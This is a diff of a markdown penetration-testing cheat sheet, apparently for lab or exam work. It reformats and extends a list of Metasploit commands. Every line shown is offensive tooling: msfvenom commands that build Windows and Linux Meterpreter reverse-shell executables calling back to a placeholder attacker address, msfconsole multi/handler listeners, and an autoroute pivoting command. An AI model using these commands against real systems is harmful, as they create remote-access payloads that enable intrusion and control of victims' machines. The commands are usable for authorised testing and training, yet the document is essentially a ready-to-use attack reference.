@@ -712,19 +712,42 @@ kerberos::purge
 
 ```
 sudo msfvenom -p windows/x64/meterpreter/reverse_http lhost=192.168.x.x lport=8080 EXITFUNC=thread -f csharp
+```
 
+```
 sudo msfconsole -qx "use exploit/multi/handler ;set payload windows/meterpreter/reverse_tcp; set lhost tun0; set lport 4444;exploit;"
+```
 
+```
 sudo msfconsole -qx "use exploit/multi/handler ;set payload linux/x86/meterpreter/reverse_tcp; set lhost tun0; set lport 4444;exploit;"
+```
 
-autorun
-
-set autoroute 'route 172.16.x.0/24';
-
+```
 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.x.x lport=4444 -f exe -o 4444.exe
+```
 
+```
 msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.x.x lport=4444 -f elf -o lin-4444
 ```
+
+```
+msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.x.x lport=4444 -f exe -o 4444.exe
+```
+
+```
+msfvenom -p linux/x86/meterpreter/reverse_https lhost=192.168.x.x lport=4444 -f elf -o lin-4444
+```
+
+<br>
+<br>
+
+### autorun
+
+```
+set autoroute 'route 172.16.x.0/24';
+```
+
+
 <br>
 <br>
 
